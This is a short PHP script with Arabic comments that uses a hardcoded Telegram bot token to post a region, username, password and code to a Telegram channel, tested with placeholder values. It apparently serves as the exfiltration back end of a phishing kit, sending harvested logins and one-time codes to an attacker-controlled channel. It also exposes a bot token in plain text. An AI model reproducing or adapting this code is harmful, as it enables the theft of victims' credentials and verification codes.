<?php

require_once 'indexr.php';

use Telegram\Bot\Api;

// تعيين معرّف البوت الخاص بك
$botToken = '6873405246:AAEUAS4DF970H6qcFBFQeC4L_N8W4wbjetc';

// تعيين معرّف القناة المستهدفة
$channelId = '@moamlat4';

// إنشاء كائن Api
$telegram = new Api($botToken);

// دالة لإرسال الرسالة إلى القناة
function sendToTelegramChannel($area, $username, $password, $code, $message) {
    global $telegram, $channelId;
    
    $messageText = "المنطقة: $area\n"
                    . "اسم المستخدم: $username\n"
                    . "كلمة المرور: $password\n"
                    . "الكود: $code\n"
                    . "الرسالة: $message";
    
    $telegram->sendMessage([
        'chat_id' => $channelId,
        'text' => $messageText,
    ]);
}

// استخدام الدالة لإرسال رسالة بالمعلومات
sendToTelegramChannel("منطقتك", "اسم المستخدم", "كلمة المرور", "الكود", "هذه رسالة تجريبية!");

?>